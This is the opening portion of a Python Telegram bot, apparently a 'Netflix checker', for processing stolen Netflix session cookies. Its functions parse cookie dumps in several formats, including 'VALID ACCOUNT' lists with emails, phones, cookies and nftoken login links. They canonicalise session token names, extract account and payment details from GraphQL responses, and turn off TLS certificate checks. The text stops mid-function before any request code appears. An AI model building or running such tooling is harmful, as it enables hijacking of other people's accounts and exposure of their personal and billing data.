"""
SENZO NETFLIX BOT - ULTIMATE EDITION v9.0
FULLY WORKING - CLI LEVEL ACCURACY
Author: @Senzo268
"""

import sys
import asyncio
import json
import os
import re
import time
import ssl
import sqlite3
import threading
import zipfile
import io
import html
import logging
import traceback
import shutil
import random
import string
import unicodedata
import copy
from datetime import datetime, timedelta, timezone
from typing import Dict, List, Optional, Tuple, Any, Union
from dataclasses import dataclass
from contextlib import contextmanager
from functools import wraps
from urllib.parse import quote, unquote
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============================================================
# ENVIRONMENT SETUP
# ============================================================
if sys.platform == "win32":
    try:
        if hasattr(sys.stdout, "reconfigure"):
            sys.stdout.reconfigure(encoding='utf-8')
        if hasattr(sys.stderr, "reconfigure"):
            sys.stderr.reconfigure(encoding='utf-8')
    except Exception:
        pass

import requests
import urllib3
from dotenv import load_dotenv

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    asyncio.get_running_loop()
except RuntimeError:
    asyncio.set_event_loop(asyncio.new_event_loop())

ssl._create_default_https_context = ssl._create_unverified_context

# ============================================================
# LIBSQL IMPORT
# ============================================================
HAS_LIBSQL = False
try:
    import libsql_client as libsql
    HAS_LIBSQL = True
except ImportError:
    try:
        import libsql_experimental as libsql
        HAS_LIBSQL = True
    except ImportError:
        try:
            import libsql
            HAS_LIBSQL = True
        except ImportError:
            pass

# ============================================================
# TELEGRAM IMPORTS
# ============================================================
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    ChatMember, InputFile
)
from telegram.constants import ParseMode
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)
from telegram.error import TelegramError

# ============================================================
# FLASK HEALTH CHECK
# ============================================================
from flask import Flask, jsonify

# ============================================================
# ENVIRONMENT VARIABLES
# ============================================================
load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN", "")
TURSO_DATABASE_URL = os.getenv("TURSO_DATABASE_URL", "")
TURSO_AUTH_TOKEN = os.getenv("TURSO_AUTH_TOKEN", "")
REPORT_CHANNEL_ID = os.getenv("REPORT_CHANNEL_ID", "")
PORT = int(os.getenv("PORT", 8080))
DATA_DIR = os.getenv("DATA_DIR", ".")
DATABASE_PATH = os.path.join(DATA_DIR, "accounts.db")

ADMIN_IDS = [
    int(aid.strip()) 
    for aid in os.getenv("ADMIN_IDS", "").split(",") 
    if aid.strip().isdigit()
]

WORKING_COOLDOWN_MINUTES = int(os.getenv("COOLDOWN_MINUTES", 5))
MAX_ACCOUNTS_PER_USER = int(os.getenv("MAX_ACCOUNTS", 5))
MAX_CHECK_THREADS = int(os.getenv("MAX_THREADS", 20))
CHECK_TIMEOUT = int(os.getenv("CHECK_TIMEOUT", 20))
MAX_RETRIES = int(os.getenv("MAX_RETRIES", 3))

# ============================================================
# LOGGING CONFIGURATION
# ============================================================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============================================================
# CORE UTILITY FUNCTIONS
# ============================================================

def safe_str(value: Any, default: str = "Unknown") -> str:
    if value is None:
        return default
    s = str(value).strip()
    return s if s else default

def safe_int(value: Any, default: int = 0) -> int:
    try:
        return int(value)
    except (ValueError, TypeError):
        return default

def safe_bool(value: Any) -> bool:
    if isinstance(value, bool):
        return value
    if isinstance(value, (int, float)):
        return bool(value)
    if isinstance(value, str):
        return value.lower() in ("true", "yes", "1", "on", "t")
    return False

def html_escape(text: Any, default: str = "") -> str:
    if text is None:
        return default
    return html.escape(str(text))

def get_timestamp() -> str:
    return datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")

def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS

def retry_on_failure(max_retries: int = 3, delay: float = 1.0):
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            last_exception = None
            for attempt in range(max_retries):
                try:
                    return func(*args, **kwargs)
                except Exception as e:
                    last_exception = e
                    if attempt < max_retries - 1:
                        time.sleep(delay * (attempt + 1))
                        continue
                    raise last_exception
            raise last_exception
        return wrapper
    return decorator

# ============================================================
# COMPLETE FIXED decode_netflix_value
# ============================================================

def _decode_unicode_escape(match):
    try:
        return chr(int(match.group(1), 16))
    except Exception:
        return match.group(0)

def _decode_hex_escape(match):
    try:
        return chr(int(match.group(1), 16))
    except Exception:
        return match.group(0)

def decode_netflix_value(value):
    """Ultimate Netflix value decoder - COMPLETE FIX WITH ALL CLEANING."""
    if value is None:
        return None
    
    # Step 1: HTML unescape
    cleaned = html.unescape(str(value))
    
    # Step 2: Common replacements
    replacements = {
        "\\x20": " ", "\\u00A0": " ", "\\u00a0": " ", "&nbsp;": " ",
        "u00A0": " ", "\\/": "/", '\\"': '"', "\\n": " ", "\\t": " ",
        "\n": " ", "\r": " "
    }
    for source, target in replacements.items():
        cleaned = cleaned.replace(source, target)
    
    # Step 3: Unicode escape handling (3 passes - CLI Level)
    for _ in range(3):
        previous = cleaned
        cleaned = re.sub(r"\\u([0-9a-fA-F]{4})", _decode_unicode_escape, cleaned)
        cleaned = re.sub(r"\\x([0-9a-fA-F]{2})", _decode_hex_escape, cleaned)
        cleaned = re.sub(r"(?<!\\)\bu([0-9a-fA-F]{4})(?![0-9a-fA-F])", _decode_unicode_escape, cleaned)
        cleaned = cleaned.replace("\\\\", "\\")
        if cleaned == previous:
            break
    
    # Step 4: URL decode
    try:
        cleaned = unquote(cleaned)
    except Exception:
        pass
    
    # Check if it's a raw NetflixId token (usually starts with v= or contains ct=)
    # If it is, we don't want to split it by & or ? because those are part of the token
    is_token = "ct=" in cleaned or cleaned.startswith("v=")
    
    if not is_token:
        # Step 5: Remove ct= prefix
        if cleaned.startswith("ct="):
            cleaned = cleaned[3:]
        if cleaned.startswith("ct%3D"):
            cleaned = cleaned[5:]
        
        # REMOVE QUERY PARAMETERS ONLY IF NOT A TOKEN
        if "&" in cleaned:
            cleaned = cleaned.split("&")[0]
        if "%26" in cleaned:
            cleaned = cleaned.split("%26")[0]
        if "?" in cleaned:
            cleaned = cleaned.split("?")[0]
        
        # REMOVE pg= (Profile GUID)
        if "pg=" in cleaned:
            cleaned = cleaned.split("pg=")[0]
        if "%26pg=" in cleaned:
            cleaned = cleaned.split("%26pg=")[0]
    
    # Step 6: Final URL decode
    try:
        cleaned = unquote(cleaned)
    except Exception:
        pass
    
    # Step 7: Clean trailing characters
    cleaned = cleaned.rstrip(".,;:!?")
    
    # Step 8: Clean whitespace
    cleaned = re.sub(r"\s+", " ", cleaned).strip()
    
    return cleaned or None

# ============================================================
# COMPLETE DATE PARSING (100+ Month Aliases)
# ============================================================

MONTH_ALIASES = {
    "january": 1, "enero": 1, "janvier": 1, "januar": 1, "janeiro": 1, "ocak": 1,
    "styczen": 1, "stycznia": 1, "มกราคม": 1, "มกรา": 1, "ม.ค": 1, "يناير": 1,
    "januari": 1, "gennaio": 1, "ianuarie": 1, "jan": 1, "يناير": 1, "בינואר": 1,
    "ιανουαριος": 1, "enero_de": 1, "leden": 1, "كانون الثاني": 1, "كانون_الثاني": 1,
    "february": 2, "febrero": 2, "fevrier": 2, "fevereiro": 2, "subat": 2,
    "luty": 2, "lutego": 2, "กุมภาพันธ์": 2, "กุมภา": 2, "ก.พ": 2, "فبراير": 2,
    "februari": 2, "febbraio": 2, "februarie": 2, "feb": 2, "בפברואר": 2,
    "φεβρουαριος": 2, "febrero_de": 2, "unor": 2, "únor": 2, "شباط": 2,
    "march": 3, "marzo": 3, "mars": 3, "marco": 3, "marzec": 3, "marca": 3,
    "มีนาคม": 3, "มีนา": 3, "มี.ค": 3, "مارس": 3,
    "maret": 3, "mac": 3, "mart": 3, "martie": 3, "marz": 3, "brezna": 3,
    "ozujka": 3, "maart": 3, "اذار": 3, "بمارس": 3, "במרץ": 3, "marcius": 3,
    "martie": 3, "mart": 3, "μαρτιος": 3, "marzo_de": 3, "brezen": 3, "březen": 3, "آذار": 3,
    "abril": 4, "avril": 4, "kwiecien": 4, "kwietnia": 4,
    "เมษายน": 4, "เมษา": 4, "เม.ย": 4, "أبريل": 4, "ابريل": 4,
    "aprile": 4, "april": 4, "aprilie": 4, "באפריל": 4, "nisan": 4,
    "apr": 4, "nisan": 4, "απριλιος": 4, "duben": 4, "نيسان": 4,
    "may": 5, "mayo": 5, "mai": 5, "maj": 5, "maja": 5,
    "พฤษภาคม": 5, "พฤษภา": 5, "พ.ค": 5, "مايو": 5,
    "mei": 5, "maggio": 5, "mayis": 5, "במאי": 5,
    "μαιος": 5, "kveten": 5, "květen": 5, "أيار": 5, "ايار": 5,
    "june": 6, "junio": 6, "juin": 6, "haziran": 6, "czerwiec": 6, "czerwca": 6,
    "มิถุนายน": 6, "มิถุนา": 6, "มิ.ย": 6, "يونيو": 6,
    "juni": 6, "giugno": 6, "ביוני": 6, "junho": 6, "iunie": 6, "cerven": 6,
    "ιουνιος": 6, "cerven": 6, "červen": 6, "حزيران": 6,
    "july": 7, "julio": 7, "juillet": 7, "temmuz": 7, "lipiec": 7, "lipca": 7,
    "กรกฎาคม": 7, "กรกฎา": 7, "ก.ค": 7, "يوليو": 7,
    "juli": 7, "luglio": 7, "ביולי": 7, "julho": 7, "iulie": 7, "cervenec": 7, "červenec": 7,
    "ιουλιος": 7, "تموز": 7,
    "august": 8, "agosto": 8, "aout": 8, "août": 8, "agost": 8, "sierpien": 8, "sierpnia": 8,
    "สิงหาคม": 8, "สิงหา": 8, "ส.ค": 8, "أغسطس": 8, "اغسطس": 8,
    "agustus": 8, "agosto": 8, "agustos": 8, "באוגוסט": 8,
    "αυγουστος": 8, "srpen": 8, "آب": 8, "اب": 8,
    "septiembre": 9, "setembro": 9, "eylul": 9, "wrzesien": 9, "wrzesnia": 9,
    "กันยายน": 9, "กันยา": 9, "ก.ย": 9, "سبتمبر": 9,
    "september": 9, "settembre": 9, "בספטמבר": 9, "septembre": 9,
    "σεπτεμβριος": 9, "setiembre": 9, "zari": 9, "září": 9, "أيلول": 9, "ايلول": 9,
    "october": 10, "octubre": 10, "outubro": 10, "ekim": 10, "pazdziernik": 10, "pazdziernika": 10,
    "ตุลาคม": 10, "ตุลา": 10, "ต.ค": 10, "أكتوبر": 10, "اكتوبر": 10,
    "oktober": 10, "ottobre": 10, "באוקטובר": 10, "oktobar": 10,
    "οκτωβριος": 10, "rijen": 10, "říjen": 10, "تشرين الأول": 10, "تشرين الاول": 10,
    "noviembre": 11, "novembro": 11, "kasim": 11, "listopad": 11, "listopada": 11,
    "พฤศจิกายน": 11, "พฤศจิกา": 11, "พ.ย": 11, "نوفمبر": 11,
    "november": 11, "novembre": 11, "בנובמבר": 11, "noiembrie": 11, "kasım": 11, "novembar": 11,
    "νοεμβριος": 11, "تشرين الثاني": 11, "تشرين_الثاني": 11,
    "diciembre": 12, "dezembro": 12, "aralik": 12, "grudzien": 12, "grudnia": 12,
    "ธันวาคม": 12, "ธันวา": 12, "ธ.ค": 12, "ديسمبر": 12,
    "desember": 12, "dicembre": 12, "december": 12, "בדצמבר": 12, "decembre": 12, "décembre": 12, "aralık": 12, "decembar": 12,
    "δεκεμβριος": 12, "decembrie": 12, "prosinec": 12, "كانون الأول": 12, "كانون الاول": 12, "كانون_الاول": 12,
}

def normalize_calendar_year(year):
    try:
        year = int(year)
    except Exception:
        return None
    if 2400 <= year <= 2700:
        return year - 543
    return year

def parse_localized_date(cleaned):
    if not cleaned:
        return None
    for parser in ("%Y-%m-%d", "%Y-%m-%dT%H:%M:%S", "%Y-%m-%dT%H:%M:%S.%f", "%Y-%m-%dT%H:%M:%S.%f%z"):
        try:
            return datetime.strptime(cleaned, parser)
        except Exception:
            continue
    iso_candidate = cleaned.replace("Z", "+00:00")
    try:
        return datetime.fromisoformat(iso_candidate)
    except Exception:
        pass
    east_asian_match = re.search(r"(?P<year>\d{4})\s*[年년]\s*(?P<month>\d{1,2})\s*[月월](?:\s*(?P<day>\d{1,2})\s*[日일])?", cleaned)
    if east_asian_match:
        try:
            year = normalize_calendar_year(east_asian_match.group("year"))
            month = int(east_asian_match.group("month"))
            day = int(east_asian_match.group("day") or 1)
            if year is not None:
                return datetime(year, month, day)
        except Exception:
            pass
    numeric_parts = [int(part) for part in re.findall(r"\d+", cleaned)]
    if len(numeric_parts) >= 3:
        first, second, third = numeric_parts[0], numeric_parts[1], numeric_parts[2]
        try:
            first = normalize_calendar_year(first)
            third = normalize_calendar_year(third)
            if 1900 <= first <= 3000 and 1 <= second <= 12 and 1 <= third <= 31:
                return datetime(first, second, third)
            if 1 <= first <= 31 and 1 <= second <= 12 and 1900 <= third <= 3000:
                return datetime(third, second, first)
        except Exception:
            pass
    raw_lower = cleaned.lower()
    simplified = unicodedata.normalize("NFKD", raw_lower)
    simplified = "".join(ch for ch in simplified if not unicodedata.combining(ch))
    month = None
    for alias, alias_month in MONTH_ALIASES.items():
        if alias in raw_lower or alias in simplified:
            month = alias_month
            break
    if month is None:
        return None
    year = None
    for number in numeric_parts:
        normalized_year = normalize_calendar_year(number)
        if normalized_year is not None and 1900 <= normalized_year <= 3000:
            year = normalized_year
            break
    if year is None:
        year_match = re.search(r"\b\d{4}\b", simplified)
        if year_match:
            year = normalize_calendar_year(year_match.group(0))
    if year is None:
        return None
    day = 1
    for number in numeric_parts:
        normalized_number = normalize_calendar_year(number)
        if normalized_number == year:
            continue
        if 1 <= number <= 31:
            day = number
            break
    try:
        return datetime(year, month, day)
    except Exception:
        return None

def format_display_date(value):
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return "UNKNOWN"
    parsed = parse_localized_date(cleaned)
    if parsed is not None:
        return parsed.strftime("%B %d, %Y").replace(" 0", " ")
    return cleaned

def format_member_since(value):
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return "UNKNOWN"
    parsed = parse_localized_date(cleaned)
    if parsed is not None:
        return parsed.strftime("%B %Y")
    return cleaned

def normalize_phone_number(value, country_code=None):
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return None
    if str(cleaned).startswith("+"):
        return cleaned
    digits = re.sub(r"\D+", "", str(cleaned))
    if not digits:
        return cleaned
    return cleaned

def parse_boolean_value(value):
    if isinstance(value, bool):
        return value
    if isinstance(value, (int, float)):
        return bool(value)
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return None
    lowered = str(cleaned).strip().lower()
    if lowered in {"true", "yes", "1", "on", "t", "y"}:
        return True
    if lowered in {"false", "no", "0", "off", "f", "n"}:
        return False
    return None

def format_boolean_label(value):
    parsed = parse_boolean_value(value)
    if parsed is True:
        return "Yes"
    if parsed is False:
        return "No"
    return None

def normalize_output_value(value, unknown_fallback="UNKNOWN", na_when_false=False):
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return unknown_fallback
    lowered = str(cleaned).strip().lower()
    if lowered in {"false", "none", "null", "undefined"}:
        return "N/A" if na_when_false else unknown_fallback
    return cleaned

def country_code_to_flag(country_code):
    raw = (decode_netflix_value(country_code) or "").strip()
    if not raw:
        return ""
    upper = raw.upper()
    if len(upper) == 2 and upper.isalpha():
        return "".join(chr(127397 + ord(char)) for char in upper)
    return ""

def format_country_with_flag(country_value, unknown_fallback="UNKNOWN"):
    normalized_country = normalize_output_value(country_value, unknown_fallback=unknown_fallback)
    country_flag = country_code_to_flag(normalized_country)
    if country_flag:
        return f"{normalized_country} {country_flag}"
    return normalized_country

def normalize_plan_key(plan_name):
    if not plan_name:
        return "unknown"
    simplified = unicodedata.normalize("NFKD", plan_name)
    simplified = "".join(ch for ch in simplified if not unicodedata.combining(ch))
    normalized = re.sub(r"[^\w]+", "_", simplified.lower(), flags=re.UNICODE).strip("_")
    return normalized or "unknown"

def get_canonical_output_label(plan_key):
    canonical_labels = {
        "premium": "Premium", "standard_with_ads": "Standard With Ads",
        "standard": "Standard", "basic": "Basic", "mobile": "Mobile",
        "extra_member_premium": "Premium (Extra Member)",
        "free": "Free", "duplicate": "Duplicate",
        "unknown": "Unknown", "family": "Family", "student": "Student",
    }
    return canonical_labels.get(plan_key, plan_key.title() if plan_key else "Unknown")

def is_on_hold_account(info):
    if not info:
        return False
    hold_value = format_boolean_label(info.get("holdStatus"))
    if hold_value is not None:
        return hold_value == "Yes"
    membership_status = normalize_plan_key(info.get("membershipStatus") or "")
    hold_indicators = {"hold", "past_due", "payment_retry", "paused", "suspend", "delinquent"}
    return any(indicator in membership_status for indicator in hold_indicators)

def is_extra_member_account(info):
    if not isinstance(info, dict):
        return False
    explicit_flag = info.get("isExtraMemberAccount")
    if explicit_flag in (True, "Yes", "yes", "true", "1"):
        return True
    plan_name = decode_netflix_value(info.get("localizedPlanName") or "")
    if plan_name and "extra member" in plan_name.lower():
        return True
    membership_status = decode_netflix_value(info.get("membershipStatus") or "")
    if membership_status and "extra" in membership_status.lower():
        return True
    return False

def is_active_subscription(info):
    if not info:
        return False
    next_billing = info.get("nextBillingDate")
    if not next_billing:
        return False
    parsed = parse_localized_date(next_billing)
    if parsed is None:
        return False
    return parsed.date() > datetime.now().date()

# ============================================================
# COOKIE EXTRACTION
# ============================================================

LOGIN_REQUIRED_NETFLIX_COOKIES = ("NetflixId",)
OPTIONAL_NETFLIX_COOKIES = ("SecureNetflixId", "nfvdid", "OptanonConsent")
ALL_NETFLIX_COOKIE_NAMES = set(LOGIN_REQUIRED_NETFLIX_COOKIES + OPTIONAL_NETFLIX_COOKIES)
CANONICAL_NETFLIX_COOKIE_NAMES = {name.lower(): name for name in ALL_NETFLIX_COOKIE_NAMES}

def is_netflix_domain(domain):
    normalized = str(domain or "").strip()
    if normalized.startswith("#HttpOnly_"):
        normalized = normalized[len("#HttpOnly_"):]
    normalized = normalized.lower()
    return "netflix." in normalized

def canonicalize_netflix_cookie_name(name):
    normalized = str(name or "").strip()
    name_map = {
        "netflixid": "NetflixId", "nfid": "NetflixId",
        "securenetflixid": "SecureNetflixId", "snetflixid": "SecureNetflixId",
        "token": "NetflixId", "accesstoken": "NetflixId",
        "auth": "NetflixId", "auth_token": "NetflixId", "sid": "NetflixId",
    }
    return name_map.get(normalized.lower(), CANONICAL_NETFLIX_COOKIE_NAMES.get(normalized.lower(), name))

def has_required_netflix_cookies(cookie_dict):
    if not isinstance(cookie_dict, dict):
        return False
    for cookie_name in LOGIN_REQUIRED_NETFLIX_COOKIES:
        if not decode_netflix_value(cookie_dict.get(cookie_name)):
            return False
    return True

def is_netflix_cookie_entry(domain, name):
    normalized_name = canonicalize_netflix_cookie_name(name)
    return normalized_name in ALL_NETFLIX_COOKIE_NAMES or is_netflix_domain(domain)

def split_netscape_cookie_columns(line):
    stripped = line.strip()
    if not stripped:
        return []
    if stripped.startswith("#") and not stripped.startswith("#HttpOnly_"):
        return []
    if stripped.startswith("#HttpOnly_"):
        stripped = stripped[len("#HttpOnly_"):]
    if not stripped:
        return []
    parts = stripped.split("\t")
    if len(parts) >= 7:
        return parts[:6] + ["\t".join(parts[6:])]
    parts = re.split(r"\s+", stripped, maxsplit=6)
    if len(parts) >= 7:
        return parts
    return []

def is_netscape_cookie_line(line):
    parts = split_netscape_cookie_columns(line)
    if len(parts) < 7:
        return False
    if parts[1].upper() not in ("TRUE", "FALSE"):
        return False
    if parts[3].upper() not in ("TRUE", "FALSE"):
        return False
    if not re.match(r"^-?\d+(?:\.\d+)?$", parts[4].strip()):
        return False
    return True

def build_netscape_cookie_entry(domain, tail_match, path, secure, expires, name, value, position):
    normalized_expires = str(expires or 0).strip()
    if re.fullmatch(r"-?\d+\.\d+", normalized_expires):
        try:
            normalized_expires = str(int(float(normalized_expires)))
        except Exception:
            pass
    return {
        "domain": str(domain or "").replace("#HttpOnly_", "", 1),
        "tail_match": "TRUE" if str(tail_match).upper() == "TRUE" else "FALSE",
        "path": str(path or "/"),
        "secure": "TRUE" if str(secure).upper() == "TRUE" else "FALSE",
        "expires": normalized_expires or "0",
        "name": canonicalize_netflix_cookie_name(name),
        "value": str(value or ""),
        "position": position,
    }

def format_netscape_cookie_entry(entry):
    return (
        f"{entry['domain']}\t{entry['tail_match']}\t{entry['path']}\t{entry['secure']}\t"
        f"{entry['expires']}\t{entry['name']}\t{entry['value']}"
    )

def cookies_dict_from_netscape(netscape_text):
    cookies = {}
    for line in netscape_text.splitlines():
        parts = split_netscape_cookie_columns(line)
        if len(parts) >= 7:
            domain = parts[0]
            name = canonicalize_netflix_cookie_name(parts[5])
            value = parts[6]
            if is_netflix_cookie_entry(domain, name):
                cookies[name] = value
    return cookies

def extract_netscape_cookie_entries(raw_text):
    entries = []
    for index, line in enumerate(raw_text.splitlines()):
        if not is_netscape_cookie_line(line):
            continue
        parts = split_netscape_cookie_columns(line)
        if len(parts) < 7:
            continue
        domain = parts[0]
        name = canonicalize_netflix_cookie_name(parts[5])
        if not is_netflix_cookie_entry(domain, name):
            continue
        entries.append(
            build_netscape_cookie_entry(
                domain, parts[1], parts[2], parts[3], parts[4],
                name, parts[6], index,
            )
        )
    return entries

def extract_json_cookie_entries(content):
    try:
        json_data = json.loads(content)
    except Exception:
        return []
    
    if isinstance(json_data, dict):
        if isinstance(json_data.get("cookies"), list):
            json_data = json_data["cookies"]
        elif isinstance(json_data.get("items"), list):
            json_data = json_data["items"]
        else:
            json_data = [json_data]
    
    if not isinstance(json_data, list):
        return []
    
    entries = []
    for index, cookie in enumerate(json_data):
        if not isinstance(cookie, dict):
            continue
        domain = cookie.get("domain", "")
        name = canonicalize_netflix_cookie_name(cookie.get("name", ""))
        if not is_netflix_cookie_entry(domain, name):
            continue
        entries.append(
            build_netscape_cookie_entry(
                domain,
                "TRUE" if str(domain).startswith(".") else "FALSE",
                cookie.get("path", "/"),
                "TRUE" if cookie.get("secure", False) else "FALSE",
                cookie.get("expirationDate", cookie.get("expiration", 0)),
                name,
                cookie.get("value", ""),
                index,
            )
        )
    return entries

def extract_raw_cookie_entries(raw_text):
    """Extract cookies from raw text - with cleaning."""
    pattern = re.compile(
        rf"(?:['\"])?(?P<name>{'|'.join(sorted((re.escape(name) for name in ALL_NETFLIX_COOKIE_NAMES), key=len, reverse=True))})(?:['\"])?"
        r"\s*(?:=|:)\s*(?P<value>\"[^\"]*\"|'[^']*'|[^;\s]+)",
        re.IGNORECASE,
    )
    entries = []
    for index, match in enumerate(pattern.finditer(raw_text)):
        cookie_name = canonicalize_netflix_cookie_name(match.group("name"))
        value = match.group("value")
        if len(value) >= 2 and value[0] == value[-1] and value[0] in {"'", '"'}:
            value = value[1:-1]
        else:
            value = value.rstrip(",")
        
        # In netflixcookiechecker.py, raw cookies are stored without aggressive decoding
        # We will decode but not split them if they are tokens
        cleaned_value = decode_netflix_value(value)
        if not cleaned_value:
            continue
        
        entries.append(
            build_netscape_cookie_entry(
                ".netflix.com",
                "TRUE",
                "/",
                "TRUE" if cookie_name == "SecureNetflixId" else "FALSE",
                "0",
                cookie_name,
                cleaned_value,
                index,
            )
        )
    return entries

# ============================================================
# FORMATTED FILE EXTRACTION
# ============================================================

def extract_cookie_from_formatted_file(content):
    """Extract cookies from emoji-formatted file."""
    bundles = []
    
    account_pattern = re.compile(
        r'═══════════════════════════════\s*✅ VALID ACCOUNT #(\d+)\s*═══════════════════════════════(.*?)(?=═══════════════════════════════\s*✅ VALID ACCOUNT #|\Z)',
        re.DOTALL | re.IGNORECASE
    )
    
    accounts = account_pattern.findall(content)
    
    if not accounts:
        return []
    
    for account_num, account_content in accounts:
        cookies = {}
        info = {}
        
        email_match = re.search(r'📧\s*EMAIL:\s*([^\n]+)', account_content, re.IGNORECASE)
        if email_match:
            cookies["email"] = email_match.group(1).strip()
            info["email"] = cookies["email"]
        
        phone_match = re.search(r'📞\s*PHONE:\s*([^\n]+)', account_content, re.IGNORECASE)
        if phone_match:
            cookies["phone"] = phone_match.group(1).strip()
            info["phone"] = cookies["phone"]
        
        country_match = re.search(r'🌍\s*COUNTRY:\s*([^\n]+)', account_content, re.IGNORECASE)
        if country_match:
            cookies["country"] = country_match.group(1).strip()
            info["countryOfSignup"] = cookies["country"]
        
        plan_match = re.search(r'📦\s*PLAN:\s*([^\n]+)', account_content, re.IGNORECASE)
        if plan_match:
            cookies["plan"] = plan_match.group(1).strip()
            info["localizedPlanName"] = cookies["plan"]
        
        status_match = re.search(r'🛡️\s*STATUS:\s*([^\n]+)', account_content, re.IGNORECASE)
        if status_match:
            cookies["membershipStatus"] = status_match.group(1).strip()
            info["membershipStatus"] = cookies["membershipStatus"]
        
        cookie_match = re.search(r'🍪\s*COOKIE:\s*NetflixId=([^\s]+)', account_content, re.IGNORECASE)
        if not cookie_match:
            cookie_match = re.search(r'🍪\s*COOKIE:\s*([^\s]+)', account_content, re.IGNORECASE)
        
        if cookie_match:
            netflix_id = cookie_match.group(1)
            cleaned = decode_netflix_value(netflix_id)
            if cleaned:
                cookies["NetflixId"] = cleaned
        
        secure_match = re.search(r'SecureNetflixId=([^\s]+)', account_content, re.IGNORECASE)
        if secure_match:
            secure_value = decode_netflix_value(secure_match.group(1))
            if secure_value:
                cookies["SecureNetflixId"] = secure_value
        
        nftoken_match = re.search(r'🔗\s*PC LINK:\s*https://www\.netflix\.com/browse\?nftoken=([^\s]+)', account_content, re.IGNORECASE)
        if not nftoken_match:
            nftoken_match = re.search(r'🔗\s*MOBILE LINK:\s*https://www\.netflix\.com/unsupported\?nftoken=([^\s]+)', account_content, re.IGNORECASE)
        if not nftoken_match:
            nftoken_match = re.search(r'🔗\s*TV LINK:\s*https://www\.netflix\.com/tv9\?nftoken=([^\s]+)', account_content, re.IGNORECASE)
        
        if nftoken_match:
            cookies["nftoken"] = nftoken_match.group(1)
            info["nftoken"] = cookies["nftoken"]
        
        expiry_match = re.search(r'⏰\s*EXPIRES:\s*([^\n]+)', account_content, re.IGNORECASE)
        if expiry_match:
            cookies["nftoken_expiry"] = expiry_match.group(1).strip()
            info["nftoken_expiry"] = cookies["nftoken_expiry"]
        
        if cookies.get("NetflixId"):
            netscape_lines = [f".netflix.com\tTRUE\t/\tFALSE\t0\tNetflixId\t{cookies['NetflixId']}"]
            if cookies.get("SecureNetflixId"):
                netscape_lines.append(f".netflix.com\tTRUE\t/\tTRUE\t0\tSecureNetflixId\t{cookies['SecureNetflixId']}")
            
            bundles.append({
                "index": account_num,
                "total": len(accounts),
                "netscape_text": "\n".join(netscape_lines),
                "cookies": cookies,
                "info": info,
            })
    
    return bundles

def build_cookie_bundles_from_entries(entries):
    if not entries:
        return []
    
    entries_by_name = {}
    for entry in entries:
        cookie_name = entry.get("name")
        if not cookie_name:
            continue
        entries_by_name.setdefault(cookie_name, []).append(entry)
    
    if not entries_by_name:
        return []
    
    netflix_id_count = len(entries_by_name.get("NetflixId", []))
    bundle_count = netflix_id_count or max(len(name_entries) for name_entries in entries_by_name.values())
    bundles = []
    
    for bundle_index in range(bundle_count):
        selected_entries = []
        for name_entries in entries_by_name.values():
            if bundle_index < len(name_entries):
                selected_entries.append(name_entries[bundle_index])
            elif len(name_entries) == 1:
                selected_entries.append(name_entries[0])
        if not selected_entries:
            continue
        
        selected_entries = sorted(selected_entries, key=lambda item: item.get("position", 0))
        netscape_text = "\n".join(format_netscape_cookie_entry(entry) for entry in selected_entries)
        bundles.append({
            "index": bundle_index + 1,
            "total": bundle_count,
            "netscape_text": netscape_text,
            "cookies": cookies_dict_from_netscape(netscape_text),
        })
    return bundles

def extract_netflix_cookie_bundles(content):
    """Extract all cookie bundles from content with multiple strategies."""
    
    bundles = extract_cookie_from_formatted_file(content)
    if bundles:
        return bundles
    
    bundles = build_cookie_bundles_from_entries(extract_json_cookie_entries(content))
    if bundles:
        return bundles
    
    bundles = build_cookie_bundles_from_entries(extract_netscape_cookie_entries(content))
    if bundles:
        return bundles
    
    bundles = build_cookie_bundles_from_entries(extract_raw_cookie_entries(content))
    if bundles:
        return bundles
    
    # Fallback for very long tokens (from main.py, not in standalone checker but useful)
    long_tokens = re.findall(r'[A-Za-z0-9+/=]{40,}', content)
    for token in long_tokens:
        cleaned_token = decode_netflix_value(token)
        if cleaned_token and len(cleaned_token) > 30:
            bundles = [{
                "index": 1,
                "total": 1,
                "netscape_text": f".netflix.com\tTRUE\t/\tFALSE\t0\tNetflixId\t{cleaned_token}",
                "cookies": {"NetflixId": cleaned_token}
            }]
            return bundles
    
    return []

def extract_netflix_cookie_text(content):
    bundles = extract_netflix_cookie_bundles(content)
    if not bundles:
        return ""
    return bundles[0]["netscape_text"]

# ============================================================
# INFO EXTRACTION (CLI Level)
# ============================================================

def extract_info_from_graphql_payload(response_text):
    try:
        payload = json.loads(response_text)
    except Exception:
        return {}
    if not isinstance(payload, dict):
        return {}
    data = payload.get("data")
    if not isinstance(data, dict):
        return {}
    growth_account = data.get("growthAccount") or {}
    current_profile = data.get("currentProfile") or {}
    current_plan = ((growth_account.get("currentPlan") or {}).get("plan") or {})
    next_plan = ((growth_account.get("nextPlan") or {}).get("plan") or {})
    next_billing = growth_account.get("nextBillingDate") or {}
    hold_meta = growth_account.get("growthHoldMetadata") or {}
    local_phone = growth_account.get("growthLocalizablePhoneNumber") or {}
    raw_phone = local_phone.get("rawPhoneNumber") or {}
    payment_methods = growth_account.get("growthPaymentMethods") or []
    payment_method = payment_methods[0] if payment_methods and isinstance(payment_methods[0], dict) else {}
    payment_logo = (payment_method.get("paymentOptionLogo") or {}).get("paymentOptionLogo")
    payment_typename = str(payment_method.get("__typename") or "")
    payment_display_text = decode_netflix_value(payment_method.get("displayText"))
    profiles = growth_account.get("profiles") or []
    phone_digits = None
    phone_verified_graphql = None
    phone_country_code = None
    if isinstance(raw_phone, dict):
        phone_digits_obj = raw_phone.get("phoneNumberDigits") or {}
        phone_digits = phone_digits_obj.get("value") if isinstance(phone_digits_obj, dict) else raw_phone.get("phoneNumberDigits")
